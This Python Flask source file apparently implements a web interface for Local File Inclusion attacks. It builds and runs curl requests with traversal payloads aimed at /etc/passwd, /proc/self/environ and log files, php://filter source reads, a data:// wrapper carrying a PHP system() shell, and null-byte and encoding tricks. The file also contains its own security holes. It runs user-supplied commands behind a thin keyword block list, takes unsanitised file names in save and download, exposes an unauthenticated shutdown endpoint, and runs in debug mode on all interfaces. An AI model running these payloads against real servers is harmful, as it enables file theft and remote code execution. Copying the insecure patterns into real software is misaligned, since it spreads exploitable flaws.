import os
import subprocess
import shlex
import json
from flask import Flask, render_template, request, jsonify, send_file
import threading
import queue
import time
import uuid # For unique filenames
import shutil # Added for shutil.which
import sys # To detect OS and get command-line arguments
import urllib.parse # For URL encoding

app = Flask(__name__)

# Directory to store temporary files (e.g., scan outputs)
UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# In-memory storage for command outputs.
lfi_outputs = {}
lfi_processes = {} # To keep track of running curl processes
lfi_queues = {} # To store queues for real-time output

# Load examples from lfi_examples.txt
def load_examples(filename="lfi_examples.txt"):
    """Loads examples from a JSON file."""
    try:
        filepath = os.path.join(os.path.dirname(__file__), filename)
        with open(filepath, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"Error: Examples file '{filename}' not found. Please ensure it's in the same directory as app.py.")
        return []
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON from '{filename}': {e}")
        return []
    except Exception as e:
        print(f"An unexpected error occurred while loading examples: {e}")
        return []

ALL_LFI_EXAMPLES = load_examples()

@app.route('/')
def index():
    """Renders the main LFI GUI HTML page."""
    return render_template('index.html')

@app.route('/get_examples', methods=['GET'])
def get_examples():
    """Returns the LFI examples as JSON."""
    return jsonify(ALL_LFI_EXAMPLES)

@app.route('/generate_curl_command', methods=['POST'])
def generate_curl_command():
    """Generates the curl command based on form data for LFI exploitation."""
    data = request.json
    
    target_url = data.get('target_url_entry', '').strip()
    param_name = data.get('param_name_entry', '').strip()
    http_method = data.get('http_method_select', 'GET').upper()
    request_body = data.get('request_body_entry', '').strip()
    
    payload_select = data.get('payload_select', '').strip()
    custom_payload = data.get('custom_payload_entry', '').strip()
    traversal_depth = int(data.get('traversal_depth_entry', 0)) if data.get('traversal_depth_entry') else 0
    log_file_path = data.get('log_file_path_entry', '').strip()

    url_encode = data.get('url_encode_checkbox', False)
    double_url_encode = data.get('double_url_encode_checkbox', False)
    null_byte = data.get('null_byte_checkbox', False)

    custom_headers = data.get('custom_headers_entry', '').strip()
    cookies = data.get('cookies_entry', '').strip()
    basic_auth_username = data.get('basic_auth_username', '').strip()
    basic_auth_password = data.get('basic_auth_password', '').strip()
    bearer_token = data.get('bearer_token_entry', '').strip()
    proxy_address = data.get('proxy_address_entry', '').strip()
    additional_args = data.get('additional_args_entry', '').strip()

    command_parts = ["curl"]

    # Add verbose output by default for better debugging
    command_parts.append("-v")

    # Construct the payload
    payload_to_use = ""
    if payload_select == 'custom':
        payload_to_use = custom_payload
    elif payload_select == 'etc_passwd':
        payload_to_use = "/etc/passwd"
    elif payload_select == 'windows_ini':
        payload_to_use = "c:\\windows\\win.ini"
    elif payload_select == 'proc_self_environ':
        payload_to_use = "/proc/self/environ"
    elif payload_select == 'apache_access_log':
        payload_to_use = log_file_path if log_file_path else "/var/log/apache2/access.log"
    elif payload_select == 'php_filter_base64':
        # This will be used with the target URL's parameter, so the actual file path needs to be appended
        payload_to_use = "php://filter/convert.base64-encode/resource="
    elif payload_select == 'data_wrapper':
        # This is a full payload, not to be appended to a parameter
        payload_to_use = "data://text/plain,<?php system($_GET['cmd']); ?>"

    # Add directory traversal if specified and applicable
    if traversal_depth > 0 and payload_select not in ['data_wrapper']:
        traversal_prefix = "../" * traversal_depth
        payload_to_use = traversal_prefix + payload_to_use

    # Add null byte if checked and applicable
    if null_byte and payload_select not in ['data_wrapper']:
        payload_to_use += "%00"

    # Apply encoding
    if double_url_encode:
        payload_to_use = urllib.parse.quote(urllib.parse.quote(payload_to_use, safe=''), safe='')
    elif url_encode:
        payload_to_use = urllib.parse.quote(payload_to_use, safe='')

    # Construct the full URL or parameter for GET/POST
    full_url = target_url
    if http_method == 'GET':
        if param_name and payload_to_use:
            # Check if URL already has query parameters
            if '?' in full_url:
                full_url += f"&{param_name}={payload_to_use}"
            else:
                full_url += f"?{param_name}={payload_to_use}"
        elif payload_select == 'data_wrapper':
            full_url = payload_to_use # data:// wrapper is the full URL
    
    command_parts.append(shlex.quote(full_url))

    # HTTP Method and Body
    if http_method == 'POST':
        command_parts.append("-X POST")
        if request_body:
            command_parts.append("-d")
            command_parts.append(shlex.quote(request_body))
        elif param_name and payload_to_use:
            # If POST and no custom body, send payload in form-urlencoded
            command_parts.append("-d")
            command_parts.append(shlex.quote(f"{param_name}={payload_to_use}"))

    # Headers
    if custom_headers:
        for header_line in custom_headers.split('\n'):
            header_line = header_line.strip()
            if header_line:
                command_parts.append("-H")
                command_parts.append(shlex.quote(header_line))
    
    # Cookies
    if cookies:
        command_parts.append("-b")
        command_parts.append(shlex.quote(cookies))

    # Authentication
    if basic_auth_username and basic_auth_password:
        command_parts.append("-u")
        command_parts.append(shlex.quote(f"{basic_auth_username}:{basic_auth_password}"))
    if bearer_token:
        command_parts.append("-H")
        command_parts.append(shlex.quote(f"Authorization: Bearer {bearer_token}"))

    # Proxy
    if proxy_address:
        command_parts.append("-x")
        command_parts.append(shlex.quote(proxy_address))

    # Additional arguments
    if additional_args:
        try:
            split_args = shlex.split(additional_args)
            command_parts.extend(split_args)
        except ValueError:
            # Fallback if shlex can't parse, just add as a single string (less safe)
            command_parts.append(shlex.quote(additional_args))

    generated_cmd = " ".join(command_parts)
    return jsonify({'command': generated_cmd})

@app.route('/run_curl', methods=['POST'])
def run_curl():
    """
    Executes the curl command received from the frontend.
    IMPORTANT: Running arbitrary commands from user input on a web server is a severe security risk.
    This implementation is for demonstration and should NOT be used in a production environment
    without extensive security measures, input validation, and sandboxing.
    """
    data = request.json
    command_str = data.get('command')
    scan_id = str(uuid.uuid4()) # Unique ID for this execution

    if not command_str:
        return jsonify({'status': 'error', 'message': 'No command provided.'}), 400

    # Basic check to prevent common dangerous commands. This is NOT exhaustive.
    if any(cmd in command_str for cmd in ['rm ', 'sudo ', 'reboot', 'shutdown', 'init ', 'mv ', 'cp ']):
        return jsonify({'status': 'error', 'message': 'Potentially dangerous command detected. Operation aborted.'}), 403

    # Use shlex.split to safely split the command string into a list
    try:
        command = shlex.split(command_str)
    except ValueError as e:
        return jsonify({'status': 'error', 'message': f'Error parsing command: {e}'}), 400

    # Ensure curl is the command being run
    if command[0] != 'curl':
        return jsonify({'status': 'error', 'message': 'Only curl commands are allowed.'}), 403

    # Check if curl executable exists using shutil.which
    if shutil.which(command[0]) is None:
        return jsonify({'status': 'error', 'message': f"curl executable '{command[0]}' not found on the server. Please ensure curl is installed and accessible in the system's PATH."}), 500

    # Create a new queue for this scan's real-time output
    output_queue = queue.Queue()
    lfi_queues[scan_id] = output_queue
    lfi_outputs[scan_id] = "" # Initialize full output storage

    def _run_curl_thread(cmd, q, scan_id_val):
        full_output_buffer = []
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, # Merge stderr into stdout for simpler real-time logging
                text=True,
                bufsize=1, # Line-buffered
                universal_newlines=True
            )
            lfi_processes[scan_id_val] = process

            for line in iter(process.stdout.readline, ''):
                q.put(line) # Put each line into the queue
                full_output_buffer.append(line) # Also append to buffer for final output

            process.wait()
            return_code = process.returncode

            final_status_line = f"\ncurl finished with exit code: {return_code}\n"
            final_status_line += f"STATUS: {'Completed' if return_code == 0 else 'Failed'}\n"
            q.put(final_status_line) # Add final status to queue

            full_output_buffer.append(final_status_line)
            lfi_outputs[scan_id_val] = "".join(full_output_buffer) # Store complete output

        except FileNotFoundError:
            error_msg = f"Error: '{cmd[0]}' command not found. Make sure curl is installed and in your system's PATH.\nSTATUS: Error\n"
            q.put(error_msg)
            lfi_outputs[scan_id_val] = error_msg
        except Exception as e:
            error_msg = f"An unexpected error occurred: {e}\nSTATUS: Error\n"
            q.put(error_msg)
            lfi_outputs[scan_id_val] = error_msg
        finally:
            if scan_id_val in lfi_processes:
                del lfi_processes[scan_id_val]
            # Signal end of output by putting a special marker
            q.put("---SCAN_COMPLETE---")


    # Start the curl process in a separate thread
    thread = threading.Thread(target=_run_curl_thread, args=(command, output_queue, scan_id))
    thread.daemon = True
    thread.start()

    return jsonify({'status': 'running', 'scan_id': scan_id, 'message': 'curl command started.'})

@app.route('/get_scan_output/<scan_id>', methods=['GET'])
def get_scan_output(scan_id):
    """
    Polls for real-time curl command output.
    Returns new lines from the queue or the final output if command is complete.
    """
    output_queue = lfi_queues.get(scan_id)
    if not output_queue:
        # If queue is not found, check if the command completed and its final output is stored
        final_output = lfi_outputs.get(scan_id)
        final_status = lfi_outputs.get(scan_id + "_status") # Check for installation status
        if final_output and final_status:
            return jsonify({'status': final_status, 'output': final_output})
        elif final_output: # If it's a regular command that completed
            return jsonify({'status': 'completed', 'output': final_output})
        return jsonify({'status': 'not_found', 'message': 'Scan ID not found or expired.'}), 404

    new_output_lines = []
    scan_finished = False
    install_success = False
    install_failure = False

    try:
        while True:
            # Get items from queue without blocking
            line = output_queue.get_nowait()
            if line == "---SCAN_COMPLETE---":
                scan_finished = True
                break
            elif line == "---INSTALL_COMPLETE_SUCCESS---":
                install_success = True
                scan_finished = True # Treat installation completion as a scan completion for frontend
                break
            elif line == "---INSTALL_COMPLETE_FAILURE---":
                install_failure = True
                scan_finished = True # Treat installation completion as a scan completion for frontend
                break
            new_output_lines.append(line)
    except queue.Empty:
        pass # No more lines in queue for now

    current_output_segment = "".join(new_output_lines)

    if scan_finished:
        # Scan or installation is truly complete, clean up the queue
        if scan_id in lfi_queues:
            del lfi_queues[scan_id]
        status_to_return = 'completed'
        if install_success:
            status_to_return = 'success'
        elif install_failure:
            status_to_return = 'error'
        
        # Ensure the final output includes all accumulated output
        final_output_content = lfi_outputs.get(scan_id, "Command/Installation completed, but output not fully captured.")
        return jsonify({'status': status_to_return, 'output': final_output_content})
    else:
        # Command/Installation is still running, return partial output
        return jsonify({'status': 'running', 'output': current_output_segment})


@app.route('/save_output', methods=['POST'])
def save_output():
    """Saves the provided content to a file on the server and allows download."""
    data = request.json
    content = data.get('content')
    filename = data.get('filename', f'lfi_output_{uuid.uuid4()}.txt')

    if not content:
        return jsonify({'status': 'error', 'message': 'No content to save.'}), 400

    file_path = os.path.join(UPLOAD_FOLDER, filename)
    try:
        with open(file_path, 'w') as f:
            f.write(content)
        return jsonify({'status': 'success', 'message': 'File saved successfully.', 'download_url': f'/download_output/{filename}'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': f'Failed to save file: {e}'}), 500

@app.route('/download_output/<filename>')
def download_output(filename):
    """Allows downloading a previously saved output file."""
    file_path = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)
    else:
        return jsonify({'status': 'error', 'message': 'File not found.'}), 404

@app.route('/install_curl', methods=['POST'])
def install_curl():
    """
    Attempts to install curl on the server (Linux/Termux only).
    WARNING: This endpoint executes system commands with 'sudo'.
    This is a significant security risk and should ONLY be used in a
    controlled, isolated development environment where you fully trust
    the users and the environment. In a production setting, exposing
    such functionality is highly discouraged.
    """
    data = request.json
    platform_type = data.get('platform') # 'linux' or 'termux'

    # Check if running on Linux or Termux (sys.platform for Termux is 'linux')
    if sys.platform.startswith('linux'):
        scan_id = str(uuid.uuid4()) # Unique ID for this installation process
        full_output = []
        output_queue = queue.Queue()
        lfi_queues[scan_id] = output_queue
        lfi_outputs[scan_id] = "" # Initialize full output storage for this ID

        def _install_thread(q, current_scan_id, p_type):
            temp_buffer_thread = [] # Local buffer for the thread
            try:
                if p_type == 'termux':
                    update_command = shlex.split("pkg update -y")
                    install_command = shlex.split("pkg install curl -y")
                    q.put("Detected Termux. Using 'pkg' for installation.\n")
                elif p_type == 'linux':
                    update_command = shlex.split("sudo apt update -y")
                    install_command = shlex.split("sudo apt install curl -y")
                    q.put("Detected Linux. Using 'sudo apt' for installation.\n")
                else:
                    q.put("Error: Unsupported platform type for installation.\n")
                    q.put("---INSTALL_COMPLETE_FAILURE---")
                    return

                # First, update package list
                q.put(f"Executing: {' '.join(update_command)}\n")
                update_process = subprocess.Popen(
                    update_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    universal_newlines=True
                )
                for line in iter(update_process.stdout.readline, ''):
                    q.put(line)
                    temp_buffer_thread.append(line)
                update_process.wait()
                if update_process.returncode != 0:
                    q.put(f"Update command failed with exit code {update_process.returncode}\n")
                    raise subprocess.CalledProcessError(update_process.returncode, update_command, "".join(temp_buffer_thread), "")

                # Then, install curl
                q.put(f"\nExecuting: {' '.join(install_command)}\n")
                install_process = subprocess.Popen(
                    install_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    universal_newlines=True
                )
                for line in iter(install_process.stdout.readline, ''):
                    q.put(line)
                    temp_buffer_thread.append(line)
                install_process.wait()
                if install_process.returncode != 0:
                    q.put(f"Install command failed with exit code {install_process.returncode}\n")
                    raise subprocess.CalledProcessError(install_process.returncode, install_command, "".join(temp_buffer_thread), "")
                
                # Signal success and store final output
                q.put("---INSTALL_COMPLETE_SUCCESS---")
                lfi_outputs[current_scan_id] = "".join(temp_buffer_thread)

            except subprocess.CalledProcessError as e:
                error_output = f"Command failed with exit code {e.returncode}:\n{e.stdout}"
                q.put(error_output)
                q.put("---INSTALL_COMPLETE_FAILURE---")
                lfi_outputs[current_scan_id] = "".join(temp_buffer_thread) + error_output
            except FileNotFoundError as e:
                error_msg = f"Error: Command not found ({e}). Ensure 'sudo'/'apt'/'pkg' is installed and in PATH.\n"
                q.put(error_msg)
                q.put("---INSTALL_COMPLETE_FAILURE---")
                lfi_outputs[current_scan_id] = "".join(temp_buffer_thread) + error_msg
            except Exception as e:
                error_msg = f"An unexpected error occurred during installation: {str(e)}\n"
                q.put(error_msg)
                q.put("---INSTALL_COMPLETE_FAILURE---")
                lfi_outputs[current_scan_id] = "".join(temp_buffer_thread) + error_msg

        # Start the installation in a separate thread
        install_thread = threading.Thread(target=_install_thread, args=(output_queue, scan_id, platform_type))
        install_thread.daemon = True
        install_thread.start()

        return jsonify({
            'status': 'running',
            'scan_id': scan_id, # Return the unique ID for polling
            'message': f'curl installation for {platform_type} started. Polling for output...'
        })
    else:
        return jsonify({
            'status': 'error',
            'message': 'curl installation via this interface is only supported on Linux/Termux systems.',
            'output': 'Operating system is not Linux or Termux.'
        }), 400

# Function to gracefully shut down the Flask server
def shutdown_server():
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        raise RuntimeError('Not running with the Werkzeug Server')
    func()

@app.route('/shutdown', methods=['POST'])
def shutdown():
    """Endpoint to gracefully shut down the Flask application."""
    print("Received shutdown request.")
    # You might want to add authentication/authorization here in a real app
    shutdown_server()
    return 'Server shutting down...', 200

if __name__ == '__main__':
    port = 5000 
    if '--port' in sys.argv:
        try:
            port_index = sys.argv.index('--port') + 1
            port = int(sys.argv[port_index])
        except (ValueError, IndexError):
            print("Warning: Invalid or missing port argument for sub-app. Using default port.")
    
    print(f"LFI sub-app is starting on port {port}...")
    app.run(debug=True, host='0.0.0.0', port=port)
